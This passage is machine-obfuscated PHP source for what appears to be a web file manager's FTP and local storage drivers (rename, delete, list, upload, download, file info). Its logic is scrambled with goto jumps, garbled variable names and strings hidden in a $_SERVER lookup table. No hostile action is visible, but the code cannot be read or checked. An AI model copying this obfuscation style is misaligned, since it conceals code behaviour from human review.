@ftp_rmdir($this->connect, $BÖ¹é„ÊÜç); } foreach ($e‚»õ¼Î©† as $C‘é¾É‡—Û) { if ($this->isFolder($C‘é¾É‡—Û)) { $C‘é¾É‡—Û = $this->iconvApp($C‘é¾É‡—Û); $this->delFolder($C‘é¾É‡—Û); } else { @ftp_delete($this->connect, $C‘é¾É‡—Û); } } return @ftp_rmdir($this->connect, $BÖ¹é„ÊÜç); } public function rename($dğ­ìÄ½Ù», $a÷˜Ê²ÇÛ) { goto dß¯Ä¢ô»; B®¿»Øêù: $fÄÜËœ´“‹ = rtrim($eˆÍµ˜¼ö¥, $C½Š®ªŒÑÖ[8]) . $C½Š®ªŒÑÖ[8] . $F¸®¢¢£Ê; $c½œòÇÃÍé = @ftp_rename($this->connect, $dğ­ìÄ½Ù», $fÄÜËœ´“‹); $fÄÜËœ´“‹ = $this->iconvApp($fÄÜËœ´“‹); goto EÚøà¡‰¿‚; dÜ÷õœ³××: $F¸®¢¢£Ê = $this->iconvSystem($F¸®¢¢£Ê); $dğ­ìÄ½Ù» = $this->iconvSystem($dğ­ìÄ½Ù»); $eˆÍµ˜¼ö¥ = $this->pathFather($dğ­ìÄ½Ù»); goto B®¿»Øêù; dß¯Ä¢ô»: $C½Š®ªŒÑÖ =& $_SERVER[‡’¶øåüç˜]; if (!$this->_isconn()) { return !1; } $F¸®¢¢£Ê = $this->fileNameAuto($this->pathFather($dğ­ìÄ½Ù»), $a÷˜Ê²ÇÛ); goto dÜ÷õœ³××; EÚøà¡‰¿‚: return $c½œòÇÃÍé ? $this->getPathOuter($fÄÜËœ´“‹) : !1; goto a·é¡¹±©ã; a·é¡¹±©ã: } private function folderInfo($B÷õÅŠ³æ, $BÑÒÌ¯šïì = false) { goto fÅé•Şó®£; FÄøáàÚù†: return $F˜´·ÎÃÆã; goto CéÑ›Æ†¼; e•Û¥Úœ£: $Bò“Î¼Ø“« = $this->iconvSystem($B÷õÅŠ³æ); if ($BÑÒÌ¯šïì) { return array($AÍî±ÌÍ[28] => $AÃ·¼’ó, $AÍî±ÌÍ[75] => $eÛ–Ó‰î, $AÍî±ÌÍ[29] => $AÍî±ÌÍ[76]); } $F˜´·ÎÃÆã = array($AÍî±ÌÍ[28] => $AÃ·¼’ó, $AÍî±ÌÍ[75] => $eÛ–Ó‰î, $AÍî±ÌÍ[29] => $AÍî±ÌÍ[76], $AÍî±ÌÍ[191] => 0, $AÍî±ÌÍ[107] => 0, $AÍî±ÌÍ[1169] => !0, $AÍî±ÌÍ[1170] => !0); goto FÄøáàÚù†; fÅé•Şó®£: $AÍî±ÌÍ =& $_SERVER[‡’¶øåüç˜]; $eÛ–Ó‰î = $this->getPathOuter(rtrim($B÷õÅŠ³æ, $AÍî±ÌÍ[8])); $AÃ·¼’ó = $this->pathThis($eÛ–Ó‰î); goto e•Û¥Úœ£; CéÑ›Æ†¼: } private function fileInfo($D¿Á¯ğÇ, $a½Ş©¸â¡Ÿ = false) { goto E¯™¢Ç‚¹ë; CÚãËØèµµ: $Fí¡ÂØ–£À = $this->iconvSystem($D¿Á¯ğÇ); if ($a½Ş©¸â¡Ÿ) { return array($cÛŒè†Ø®ì[28] => $CĞŞîŸå©», $cÛŒè†Ø®ì[75] => $b®èƒë¦¹¼, $cÛŒè†Ø®ì[29] => $cÛŒè†Ø®ì[171], $cÛŒè†Ø®ì[165] => $this->ext($D¿Á¯ğÇ), $cÛŒè†Ø®ì[77] => $this->size($D¿Á¯ğÇ)); } $Aè¡ªÛ‚è = array($cÛŒè†Ø®ì[28] => $CĞŞîŸå©», $cÛŒè†Ø®ì[75] => $b®èƒë¦¹¼, $cÛŒè†Ø®ì[29] => $cÛŒè†Ø®ì[171], $cÛŒè†Ø®ì[191] => 0, $cÛŒè†Ø®ì[107] => @ftp_mdtm($this->connect, $Fí¡ÂØ–£À), $cÛŒè†Ø®ì[165] => $this->ext($D¿Á¯ğÇ), $cÛŒè†Ø®ì[77] => $this->size($D¿Á¯ğÇ), $cÛŒè†Ø®ì[1169] => !0, $cÛŒè†Ø®ì[1170] => !0); goto C©ï„°«§¥; E¯™¢Ç‚¹ë: $cÛŒè†Ø®ì =& $_SERVER[‡’¶øåüç˜]; $b®èƒë¦¹¼ = $this->getPathOuter(rtrim($D¿Á¯ğÇ, $cÛŒè†Ø®ì[8])); $CĞŞîŸå©» = $this->pathThis($b®èƒë¦¹¼); goto CÚãËØèµµ; C©ï„°«§¥: $Aè¡ªÛ‚è[$cÛŒè†Ø®ì[107]] = $Aè¡ªÛ‚è[$cÛŒè†Ø®ì[107]] > 0 ? $Aè¡ªÛ‚è[$cÛŒè†Ø®ì[107]] : 0; return $Aè¡ªÛ‚è; goto B»‚Şõª•; B»‚Şõª•: } public function size($Aƒ×Ó¸ÏÊ) { $Bê¦”¿’’Í = $this->objectMeta($Aƒ×Ó¸ÏÊ); return $Bê¦”¿’’Í ? $Bê¦”¿’’Í[$_SERVER[‡’¶øåüç˜][77]] : 0; } public function info($b––Ã‡‘®¥) { if ($this->isFile($b––Ã‡‘®¥)) { return $this->fileInfo($b––Ã‡‘®¥, 0); } else { if ($this->isFolder($b––Ã‡‘®¥)) { return $this->folderInfo($b––Ã‡‘®¥); } } return !1; } public function exist($fŠË–·Ñç) { return $this->objectMeta($fŠË–·Ñç) ? !0 : !1; } public function isFile($däÌ±óŒ­) { $få¸ŸœÚ™ =& $_SERVER[‡’¶øåüç˜]; $DªÒ¡ˆïá‘ = $this->objectMeta($däÌ±óŒ­); return $DªÒ¡ˆïá‘ ? $DªÒ¡ˆïá‘[$få¸ŸœÚ™[29]] == $få¸ŸœÚ™[171] : !1; } public function isFolder($Câ…ºµ¦) { $dó¸«Ÿï¦Ò =& $_SERVER[‡’¶øåüç˜]; $dÎ¢ßÊÅ…— = $this->objectMeta($Câ…ºµ¦); return $dÎ¢ßÊÅ…— ? $dÎ¢ßÊÅ…—[$dó¸«Ÿï¦Ò[29]] == $dó¸«Ÿï¦Ò[76] : !1; } public function listPath($dÊé†İÆÎ†, $F ò×˜ãš¿ = false) { goto AòÛ‹†ñİ«; c¡¼ÜŠÃÇº: $a”Õ˜·×ö = $this->ftpList($dÊé†İÆÎ†); $fò¸Ï§êØ† = array($FßÏ„¬èÍ[74] => array(), $FßÏ„¬èÍ[73] => array()); if (!$a”Õ˜·×ö) { return $fò¸Ï§êØ†; } goto bÑÙ¹Ì·ó; AòÛ‹†ñİ«: $FßÏ„¬èÍ =& $_SERVER[‡’¶øåüç˜]; if (!$this->_isconn()) { return !1; } $dÊé†İÆÎ† = $this->iconvSystem($dÊé†İÆÎ†); goto c¡¼ÜŠÃÇº; bÑÙ¹Ì·ó: foreach ($a”Õ˜·×ö as $dÊé†İÆÎ†) { if ($this->isFolder($dÊé†İÆÎ†)) { $fò¸Ï§êØ†[$FßÏ„¬èÍ[74]][] = $this->folderInfo($dÊé†İÆÎ†, $F ò×˜ãš¿); } else { $fò¸Ï§êØ†[$FßÏ„¬èÍ[73]][] = $this->fileInfo($dÊé†İÆÎ†, $F ò×˜ãš¿); } } return $fò¸Ï§êØ†; goto F·Îø­¹„; F·Îø­¹„: } public function has($cÎŸ—×·ä, $eªôÜ÷ŒÍ² = false, $eîëÙƒñ¾Ó = true) { goto A©ó¬×å…; c´ŞÜñç«®: $Eëˆ¿ñáÍ¼ = $this->ftpList($cÎŸ—×·ä); if (!$Eëˆ¿ñáÍ¼) { return !1; } if ($eªôÜ÷ŒÍ²) { return array($cĞ¡ô®×àİ[195] => 0, $cĞ¡ô®×àİ[196] => count($Eëˆ¿ñáÍ¼)); } goto e„Î½«Ûõó; e„Î½«Ûõó: foreach ($Eëˆ¿ñáÍ¼ as $cÎŸ—×·ä) { if ($eîëÙƒñ¾Ó) { if (!$this->isFolder($cÎŸ—×·ä)) { return !0; } } else { if ($this->isFolder($cÎŸ—×·ä)) { return !0; } } } return !1; goto döÄê¼Àóí; A©ó¬×å…: $cĞ¡ô®×àİ =& $_SERVER[‡’¶øåüç˜]; if (!$this->_isconn()) { return !1; } $cÎŸ—×·ä = $this->iconvSystem($cÎŸ—×·ä); goto c´ŞÜñç«®; döÄê¼Àóí: } public function listAll($bÆÖ”ÅŒí«) { goto bé©ƒÇˆ†ç; f•…÷·ª£Ø: foreach ($BĞä°â‡«Í[$DŒÏ±¢¾Ï[74]] as $dõÙÜ‡õ¢‡) { $E¯£¤í¶ì’[] = array($DŒÏ±¢¾Ï[75] => $DŒÏ±¢¾Ï[8] . trim(str_replace($bÆÖ”ÅŒí«, $DŒÏ±¢¾Ï[33], $dõÙÜ‡õ¢‡), $DŒÏ±¢¾Ï[8]) . $DŒÏ±¢¾Ï[8], $DŒÏ±¢¾Ï[76] => 1, $DŒÏ±¢¾Ï[77] => 0); } foreach ($BĞä°â‡«Í[$DŒÏ±¢¾Ï[73]] as $a‘Á˜š•ê) { $E¯£¤í¶ì’[] = array($DŒÏ±¢¾Ï[75] => $DŒÏ±¢¾Ï[8] . trim(str_replace($bÆÖ”ÅŒí«, $DŒÏ±¢¾Ï[33], $a‘Á˜š•ê), $DŒÏ±¢¾Ï[8]), $DŒÏ±¢¾Ï[76] => 0, $DŒÏ±¢¾Ï[77] => $this->size($a‘Á˜š•ê)); } return $E¯£¤í¶ì’; goto Fª§ãŠÓ’ñ; bé©ƒÇˆ†ç: $DŒÏ±¢¾Ï =& $_SERVER[‡’¶øåüç˜]; if (!$this->_isconn()) { return !1; } $bÆÖ”ÅŒí« = $this->iconvSystem($bÆÖ”ÅŒí«); goto f¹ôàšƒÕµ; f¹ôàšƒÕµ: $BĞä°â‡«Í = array($DŒÏ±¢¾Ï[73] => array(), $DŒÏ±¢¾Ï[74] => array()); $this->recursionFtpFiles($bÆÖ”ÅŒí«, $BĞä°â‡«Í); $E¯£¤í¶ì’ = array(); goto f•…÷·ª£Ø; Fª§ãŠÓ’ñ: } public function getContent($eŠ‰÷Ó¹ì‚) { if (!$this->_isconn()) { return !1; } $eŠ‰÷Ó¹ì‚ = $this->iconvSystem($eŠ‰÷Ó¹ì‚); return $this->fileSubstr($eŠ‰÷Ó¹ì‚); } public function setContent($eƒ¤¢ºîÑ, $FŞààÙšŒ = '') { goto e¢¥„‰Å—é; e®ïÎğšïø: return $B°¡­ØİÙ‡; goto aõšˆ•à¨; e¢¥„‰Å—é: if (!$this->_isconn()) { return !1; } $aÊğåŒàÇĞ = $this->pathThis($this->iconvSystem($eƒ¤¢ºîÑ)); $E®öÔ–Ò©é = $this->tempFile($aÊğåŒàÇĞ); goto C‘äİƒËİ; C‘äİƒËİ: file_put_contents($E®öÔ–Ò©é, $FŞààÙšŒ); $B°¡­ØİÙ‡ = $this->upload($eƒ¤¢ºîÑ, $this->iconvApp($E®öÔ–Ò©é)); $this->tempFileRemve($E®öÔ–Ò©é); goto e®ïÎğšïø; aõšˆ•à¨: } public function fileSubstr($C§Ø‚»ÆÇ§, $d˜Şº“¶ØÊ = 0, $CŠ®š† ù– = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($C§Ø‚»ÆÇ§, $d˜Şº“¶ØÊ, $CŠ®š† ù–); } private function ftpRequest($cÎ¿è†µÜÖ, $aÂÒì’¢À¼ = 0, $E‘«÷‹Îé¥ = false) { goto D‹¹‹·é„ì; C‰®‹â÷Ö: curl_setopt($D—´Ï‡®¡Û, CURLOPT_RETURNTRANSFER, 1); $DğàÎ‚”‘ = curl_exec($D—´Ï‡®¡Û); curl_close($D—´Ï‡®¡Û); goto BÊ×æçô½ƒ; BÊ×æçô½ƒ: return $DğàÎ‚”‘; goto F–ø—ŞÕŸ½; D‹¹‹·é„ì: $cÎ¿è†µÜÖ = $this->iconvSystem($cÎ¿è†µÜÖ); $C¿ã”›ŠŞ· = $this->scheme . $this->host . $_SERVER[‡’¶øåüç˜][4] . $this->port; $D—´Ï‡®¡Û = curl_init(); goto fß‡—Ï×ì; fß‡—Ï×ì: curl_setopt($D—´Ï‡®¡Û, CURLOPT_URL, $C¿ã”›ŠŞ· . $this->pathEncode($cÎ¿è†µÜÖ)); curl_setopt($D—´Ï‡®¡Û, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($E‘«÷‹Îé¥) { $cä˜­ÜµãÁ = $aÂÒì’¢À¼ + $E‘«÷‹Îé¥ - 1; curl_setopt($D—´Ï‡®¡Û, CURLOPT_RANGE, "{$aÂÒì’¢À¼}\55{$cä˜­ÜµãÁ}"); } goto C‰®‹â÷Ö; F–ø—ŞÕŸ½: } public function upload($b§­›–‘òµ, $Cô…Ê¢ò†Õ, $cĞ¨ù‚Ëº = false, $d’»ôÆãá† = REPEAT_REPLACE) { goto F£Ê³Ïß; F£Ê³Ïß: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($b§­›–‘òµ))) { return !1; } $b§­›–‘òµ = $this->iconvSystem($b§­›–‘òµ); goto DÏèœ¶š—; e‹åéâŞø: if ($Eù¼—²Õ¤ != FTP_FINISHED) { return !1; } return $this->getPathOuter($b§­›–‘òµ); goto DõŒ†èË­; DÏèœ¶š—: $Cô…Ê¢ò†Õ = $this->iconvSystem($Cô…Ê¢ò†Õ); $Eù¼—²Õ¤ = ftp_nb_put($this->connect, $b§­›–‘òµ, $Cô…Ê¢ò†Õ, FTP_BINARY); while ($Eù¼—²Õ¤ == FTP_MOREDATA) { $Eù¼—²Õ¤ = ftp_nb_continue($this->connect); } goto e‹åéâŞø; DõŒ†èË­: } public function download($BÓ¨ŞíÍİÀ, $d¢½²»³Ò = '') { goto d÷Ôì“„õ; Fèª¸¢Ö¥†: while ($E°“ÄŠÎ¹ò == FTP_MOREDATA) { $E°“ÄŠÎ¹ò = ftp_nb_continue($this->connect); } if ($E°“ÄŠÎ¹ò != FTP_FINISHED) { return !1; } return $this->iconvApp($d¢½²»³Ò); goto cÄä¬²éÔÚ; d÷Ôì“„õ: if (!$this->_isconn()) { return !1; } $bŞ÷õöä¯Ç = $this->pathFather($d¢½²»³Ò); if (!IO::mkdir($bŞ÷õöä¯Ç)) { return !1; } goto eŸä¬ğ†™·; eŸä¬ğ†™·: $BÓ¨ŞíÍİÀ = $this->iconvSystem($BÓ¨ŞíÍİÀ); $d¢½²»³Ò = $this->iconvSystem($d¢½²»³Ò); $E°“ÄŠÎ¹ò = ftp_nb_get($this->connect, $d¢½²»³Ò, $BÓ¨ŞíÍİÀ, FTP_BINARY); goto Fèª¸¢Ö¥†; cÄä¬²éÔÚ: } private function ftpList($f™­ªä¨†®) { goto AñÈøµš÷; DÁá›®ºò: return $DÂ¬ãĞ½ï; goto d¼Óß²Ûëø; Fµ†ìê§áÀ: $d¡„Å¿©‹ä = array_diff($d¡„Å¿©‹ä, array($BñÒç¾©„Ï[91], $BñÒç¾©„Ï[1172], $f™­ªä¨†® . $BñÒç¾©„Ï[91], $f™­ªä¨†® . $BñÒç¾©„Ï[1172])); $DÂ¬ãĞ½ï = array(); foreach ($d¡„Å¿©‹ä as $F¡®ì’­ëÁ) { if (!strstr($F¡®ì’­ëÁ, $BñÒç¾©„Ï[8])) { $F¡®ì’­ëÁ = $f™­ªä¨†® . ltrim($F¡®ì’­ëÁ, $BñÒç¾©„Ï[8]); } $DÂ¬ãĞ½ï[] = $this->iconvApp($F¡®ì’­ëÁ); } goto DÁá›®ºò; AñÈøµš÷: $BñÒç¾©„Ï =& $_SERVER[‡’¶øåüç˜]; if (!$this->isFolder($f™­ªä¨†®)) { return !1; } @ftp_chdir($this->connect, $BñÒç¾©„Ï[8]); goto dùìˆ»À Ô; dùìˆ»À Ô: $f™­ªä¨†® = rtrim($f™­ªä¨†®, $BñÒç¾©„Ï[8]) . $BñÒç¾©„Ï[8]; $d¡„Å¿©‹ä = @ftp_nlist($this->connect, $f™­ªä¨†®); if ($d¡„Å¿©‹ä === !1) { $d¡„Å¿©‹ä = @ftp_rawlist($this->connect, $f™­ªä¨†®); foreach ($d¡„Å¿©‹ä as $aÂèŞÄ¦ñÉ => $b‡²ƒğÎĞ) { $d¡„Å¿©‹ä[$aÂèŞÄ¦ñÉ] = end(explode($BñÒç¾©„Ï[1171], $b‡²ƒğÎĞ)); } } goto Fµ†ìê§áÀ; d¼Óß²Ûëø: } private function recursionFtpFiles($a±øë†ù×, &$C‚É§ãÉ) { $eë ÷¢’ñË =& $_SERVER[‡’¶øåüç˜]; if (!$this->_isconn()) { return !1; } if (!($Dè¥„íå—¡ = $this->ftpList($a±øë†ù×))) { return !1; } foreach ($Dè¥„íå—¡ as $a±øë†ù×) { if ($this->isFolder($a±øë†ù×)) { $this->recursionFtpFiles($a±øë†ù×, $C‚É§ãÉ); $C‚É§ãÉ[$eë ÷¢’ñË[74]][] = $a±øë†ù×; } else { $C‚É§ãÉ[$eë ÷¢’ñË[73]][] = $a±øë†ù×; } } } private function objectMeta($bÚßŠ‘°–¤) { goto cİğ¡Œ²—á; E†ğĞôÑ…ì: if ($a¤…š…¦„İ !== null && $a¤…š…¦„İ !== !1) { return $a¤…š…¦„İ; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $eßã÷Ä«´À[8]); goto b–š´†å‰Ù; b–š´†å‰Ù: $AµˆïÒåà = @ftp_size($this->connect, $this->iconvSystem($bÚßŠ‘°–¤)); if ($AµˆïÒåà != -1) { $a¤…š…¦„İ = array($eßã÷Ä«´À[77] => $AµˆïÒåà, $eßã÷Ä«´À[29] => $eßã÷Ä«´À[171]); } else { $A’¨¨œá´§ = @ftp_chdir($this->connect, $this->iconvSystem($bÚßŠ‘°–¤)); $a¤…š…¦„İ = $A’¨¨œá´§ ? array($eßã÷Ä«´À[77] => 0, $eßã÷Ä«´À[29] => $eßã÷Ä«´À[76]) : !1; } Cache::set($BèçõõŒŠ, $a¤…š…¦„İ, 0); goto d˜ìŞÅ¨·; d˜ìŞÅ¨·: return $a¤…š…¦„İ; goto Dâ¥Ë¦‹Üİ; cİğ¡Œ²—á: $eßã÷Ä«´À =& $_SERVER[‡’¶øåüç˜]; $BèçõõŒŠ = $eßã÷Ä«´À[1173] . md5($bÚßŠ‘°–¤); $a¤…š…¦„İ = Cache::get($BèçõõŒŠ); goto E†ğĞôÑ…ì; Dâ¥Ë¦‹Üİ: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($D—¿ğõ“Û) { if (substr($D—¿ğõ“Û, 0, 2) == $_SERVER[‡’¶øåüç˜][1162]) { $D—¿ğõ“Û = BASIC_PATH . substr($D—¿ğõ“Û, 2); } return $D—¿ğõ“Û; } public function iconvApp($dÉÏ‡íÇÌÆ) { $FõÆ±¹êà =& $_SERVER[‡’¶øåüç˜]; global $config; return $this->iconvTo($dÉÏ‡íÇÌÆ, $config[$FõÆ±¹êà[1160]], $config[$FõÆ±¹êà[1159]]); } public function iconvSystem($CåÒ‡ÈÚáÆ) { $Aßøˆ†“‘… =& $_SERVER[‡’¶øåüç˜]; global $config; return $this->iconvTo($CåÒ‡ÈÚáÆ, $config[$Aßøˆ†“‘…[1159]], $config[$Aßøˆ†“‘…[1160]]); } public function getPathOuter($B’£ø™å¹) { goto A±…ÊÍİò›; A±…ÊÍİò›: $FÁ÷è•­Ëó =& $_SERVER[‡’¶øåüç˜]; $E§çŠªƒÙ¶ = $this->iconvApp($this->pathBase); $B’£ø™å¹ = $this->iconvApp($B’£ø™å¹); goto a¤µÅ””ø; a¤µÅ””ø: if (substr($E§çŠªƒÙ¶, 0, 2) == $FÁ÷è•­Ëó[1162]) { $E§çŠªƒÙ¶ = BASIC_PATH . substr($E§çŠªƒÙ¶, 2); } if (substr($B’£ø™å¹, 0, 2) == $FÁ÷è•­Ëó[1162]) { $B’£ø™å¹ = BASIC_PATH . substr($B’£ø™å¹, 2); } $E§çŠªƒÙ¶ = KodIO::clear($E§çŠªƒÙ¶); goto aÚÒ…Ê·ë˜; aÚÒ…Ê·ë˜: $B’£ø™å¹ = KodIO::clear($B’£ø™å¹); $B’£ø™å¹ = substr($B’£ø™å¹, strlen($E§çŠªƒÙ¶)); if (empty($this->pathDriver)) { return $B’£ø™å¹; } goto E¯ù—ÈÆø; E¯ù—ÈÆø: return $this->pathDriver . $FÁ÷è•­Ëó[8] . ltrim($B’£ø™å¹, $FÁ÷è•­Ëó[8]); goto B‘œ‡Í®£; B‘œ‡Í®£: } public function mkfile($DÏÉíµò­, $FÏ…¸ Ó­ = '', $AÀ¼Âô²ä = REPEAT_RENAME) { $DÏÉíµò­ = $this->iconvSystem($DÏÉíµò­); @touch($DÏÉíµò­); if ($FÏ…¸ Ó­) { file_put_contents($DÏÉíµò­, $FÏ…¸ Ó­); } return is_file($DÏÉíµò­) ? $this->getPathOuter($DÏÉíµò­) : !1; } public function mkdir($BåÀ«§‡Ñô, $eªÀÄ“×°š = REPEAT_SKIP) { $BåÀ«§‡Ñô = $this->iconvSystem($BåÀ«§‡Ñô); if (is_dir($BåÀ«§‡Ñô)) { return $this->getPathOuter($BåÀ«§‡Ñô); } @mkdir($BåÀ«§‡Ñô, 511, !0); return is_dir($BåÀ«§‡Ñô) ? $this->getPathOuter($BåÀ«§‡Ñô) : !1; } public function copyFile($dÜ®ºÊ½ç, $fÜ°àƒ¸ÚÆ) { $this->mkdir($this->pathFather($fÜ°àƒ¸ÚÆ)); $dÜ®ºÊ½ç = $this->iconvSystem($dÜ®ºÊ½ç); $fÜ°àƒ¸ÚÆ = $this->iconvSystem($fÜ°àƒ¸ÚÆ); $aæ×åÛŞ = copy_64($dÜ®ºÊ½ç, $fÜ°àƒ¸ÚÆ); return $aæ×åÛŞ ? $this->getPathOuter($fÜ°àƒ¸ÚÆ) : !1; } public function moveFile($EÑ«ñòÂ®ˆ, $e¯ÙŠ“¿Â’) { $this->mkdir($this->pathFather($e¯ÙŠ“¿Â’)); $EÑ«ñòÂ®ˆ = $this->iconvSystem($EÑ«ñòÂ®ˆ); $e¯ÙŠ“¿Â’ = $this->iconvSystem($e¯ÙŠ“¿Â’); $BáÑŒŸ±³Á = intval(@rename($EÑ«ñòÂ®ˆ, $e¯ÙŠ“¿Â’)); if (!$BáÑŒŸ±³Á) { if ($BáÑŒŸ±³Á = intval(@copy_64($EÑ«ñòÂ®ˆ, $e¯ÙŠ“¿Â’))) { @unlink($EÑ«ñòÂ®ˆ); } } return $BáÑŒŸ±³Á ? $this->getPathOuter($e¯ÙŠ“¿Â’) : !1; } public function delFile($eˆÚëÂì¨³) { $eˆÚëÂì¨³ = $this->iconvSystem($eˆÚëÂì¨³); if (!@unlink($eˆÚëÂì¨³)) { @chmod($eˆÚëÂì¨³, 511); if (!@unlink($eˆÚëÂì¨³)) { return !1; } } else { return !0; } } public function delFolder($cŒ¬“ôÂ) { goto Dğ´‰ôÓÃ; D†êèîğ±: return rmdir($cŒ¬“ôÂ); goto bÛİ«ŞŒÆå; AÛ‰ÚòóÜŸ: if (!($aßÉÆé® = opendir($cŒ¬“ôÂ))) { return !1; } while (($F°‚—ãË£ = readdir($aßÉÆé®)) !== !1) { if ($F°‚—ãË£ == $DÅñïíˆŸ¤[91] || $F°‚—ãË£ == $DÅñïíˆŸ¤[1172]) { continue; } $eàï¥ÚëÂ = $cŒ¬“ôÂ . $DÅñïíˆŸ¤[8] . $F°‚—ãË£; if (is_file($eàï¥ÚëÂ) || is_link($eàï¥ÚëÂ)) { if (!unlink($eàï¥ÚëÂ)) { chmod($eàï¥ÚëÂ, 511); if (!unlink($eàï¥ÚëÂ)) { return !1; } } } else { if (is_dir($eàï¥ÚëÂ)) { chmod($eàï¥ÚëÂ, 511); $eàï¥ÚëÂ = $this->iconvApp($eàï¥ÚëÂ); if (!$this->delFolder($eàï¥ÚëÂ)) { return !1; } } } } closedir($aßÉÆé®); goto D†êèîğ±; Dğ´‰ôÓÃ: $DÅñïíˆŸ¤ =& $_SERVER[‡’¶øåüç˜]; $cŒ¬“ôÂ = $this->iconvSystem($cŒ¬“ôÂ); if (!is_dir($cŒ¬“ôÂ)) { return !0; } goto AÛ‰ÚòóÜŸ; bÛİ«ŞŒÆå: } public function rename($f¼®ÇÔ­ïë, $A˜Š¦â²Ø) { goto Dèàªäëâ; f¾ğŞÑÑÆ: $fÉÏê‰·Íá = @rename($f¼®ÇÔ­ïë, $eº‹„×£); $eº‹„×£ = $this->iconvApp($eº‹„×£); return $fÉÏê‰·Íá ? $this->getPathOuter($eº‹„×£) : !1; goto A¯ğ˜™ó…¡; C¾ËÕÊ™ò‹: $f¼®ÇÔ­ïë = $this->iconvSystem($f¼®ÇÔ­ïë); $Eñ‚ÜĞ = $this->pathFather($f¼®ÇÔ­ïë); $eº‹„×£ = rtrim($Eñ‚ÜĞ, $Eø¡¶ñÍÑ[8]) . $Eø¡¶ñÍÑ[8] . $f”¢Ÿˆõôœ; goto f¾ğŞÑÑÆ; Dèàªäëâ: $Eø¡¶ñÍÑ =& $_SERVER[‡’¶øåüç˜]; $f”¢Ÿˆõôœ = $this->fileNameAuto($this->pathFather($f¼®ÇÔ­ïë), $A˜Š¦â²Ø); $f”¢Ÿˆõôœ = $this->iconvSystem($f”¢Ÿˆõôœ); goto C¾ËÕÊ™ò‹; A¯ğ˜™ó…¡: } public function size($aÚÂ’ÆˆšÈ) { $aÚÂ’ÆˆšÈ = $this->iconvSystem($aÚÂ’ÆˆšÈ); return filesize_64($aÚÂ’ÆˆšÈ); } public function info($c’ƒà¤™½å) { $c’ƒà¤™½å = $this->iconvSystem($c’ƒà¤™½å); if ($this->isFolder($c’ƒà¤™½å)) { return $this->folderInfo($c’ƒà¤™½å); } else { if ($this->isFile($c’ƒà¤™½å)) { return $this->fileInfo($c’ƒà¤™½å); } } return !1; } protected function infoChildren($bË‚‡ñÁ™, &$C¡ºÎ ‚¼, $b‹Ô¹Æ«Ô = true) { goto E¬’’Ø ÌÏ; b‚³öÓœ¸Š: closedir($DÙ¯ˆ÷Œ„Ú); goto F„²¨¯ª»Ğ; E¬’’Ø ÌÏ: $c‹—¥’öÛ =& $_SERVER[‡’¶øåüç˜]; check_abort(); $bË‚‡ñÁ™ = rtrim($bË‚‡ñÁ™, $c‹—¥’öÛ[8]) . $c‹—¥’öÛ[8]; goto c‡›ªÓ†Ã¨; c‡›ªÓ†Ã¨: if ($b‹Ô¹Æ«Ô) { $bË‚‡ñÁ™ = $this->iconvSystem($bË‚‡ñÁ™); } if (!($DÙ¯ˆ÷Œ„Ú = @opendir($bË‚‡ñÁ™))) { return; } while (($bø˜†¿´¾ø = readdir($DÙ¯ˆ÷Œ„Ú)) !== !1) { if ($bø˜†¿´¾ø == $c‹—¥’öÛ[91] || $bø˜†¿´¾ø == $c‹—¥’öÛ[1172]) { continue; } $aÒã‘Ê…ôø = $bË‚‡ñÁ™ . $bø˜†¿´¾ø; if (is_file($aÒã‘Ê…ôø) || is_link($aÒã‘Ê…ôø)) { $C¡ºÎ ‚¼[$c‹—¥’öÛ[78]]++; $C¡ºÎ ‚¼[$c‹—¥’öÛ[77]] += filesize_64($aÒã‘Ê…ôø); } else { if (is_dir($aÒã‘Ê…ôø)) { $C¡ºÎ ‚¼[$c‹—¥’öÛ[79]]++; $this->infoChildren($aÒã‘Ê…ôø, $C¡ºÎ ‚¼, !1); } } } goto b‚³öÓœ¸Š; F„²¨¯ª»Ğ: } private function folderInfo($c²Î™ÃŠæÚ, $Aù›æÍÜñğ = false) { $FŒ°ŞÏãÓ¢ =& $_SERVER[‡’¶øåüç˜]; $c²Î™ÃŠæÚ = rtrim($c²Î™ÃŠæÚ, $FŒ°ŞÏãÓ¢[8]) . $FŒ°ŞÏãÓ¢[8]; $fˆää£¯š = $this->iconvApp($this->pathThis($c²Î™ÃŠæÚ)); if ($Aù›æÍÜñğ) { return array($FŒ°ŞÏãÓ¢[28] => $fˆää£¯š, $FŒ°ŞÏãÓ¢[75] => $this->getPathOuter($c²Î™ÃŠæÚ), $FŒ°ŞÏãÓ¢[29] => $FŒ°ŞÏãÓ¢[76]); } $Cš¸çªßêˆ = array($FŒ°ŞÏãÓ¢[28] => $fˆää£¯š, $FŒ°ŞÏãÓ¢[75] => $this->getPathOuter($c²Î™ÃŠæÚ), $FŒ°ŞÏãÓ¢[29] => $FŒ°ŞÏãÓ¢[76], $FŒ°ŞÏãÓ¢[191] => @filectime($c²Î™ÃŠæÚ), $FŒ°ŞÏãÓ¢[107] => @filemtime($c²Î™ÃŠæÚ), $FŒ°ŞÏãÓ¢[1174] => @fileatime($c²Î™ÃŠæÚ), $FŒ°ŞÏãÓ¢[1169] => is_readable($c²Î™ÃŠæÚ), $FŒ°ŞÏãÓ¢[1170] => is_writable($c²Î™ÃŠæÚ), $FŒ°ŞÏãÓ¢[1175] => get_mode($c²Î™ÃŠæÚ)); return $Cš¸çªßêˆ; } private function fileInfo($Cè·‡ƒğÊ¼, $C‡ŠªÊ¸¥ = false) { $c¾ñ«‚ù¥ =& $_SERVER[‡’¶øåüç˜]; $eŞºÊ”§†Ç = $this->iconvApp($this->pathThis($Cè·‡ƒğÊ¼)); if ($C‡ŠªÊ¸¥) { return array($c¾ñ«‚ù¥[28] => $eŞºÊ”§†Ç, $c¾ñ«‚ù¥[75] => $this->getPathOuter($Cè·‡ƒğÊ¼), $c¾ñ«‚ù¥[29] => $c¾ñ«‚ù¥[171], $c¾ñ«‚ù¥[77] => $this->size($Cè·‡ƒğÊ¼), $c¾ñ«‚ù¥[165] => $this->ext($eŞºÊ”§†Ç)); } $dïÄÌå¼Õó = array($c¾ñ«‚ù¥[28] => $eŞºÊ”§†Ç, $c¾ñ«‚ù¥[75] => $this->getPathOuter($Cè·‡ƒğÊ¼), $c¾ñ«‚ù¥[29] => $c¾ñ«‚ù¥[171], $c¾ñ«‚ù¥[191] => @filectime($Cè·‡ƒğÊ¼), $c¾ñ«‚ù¥[107] => 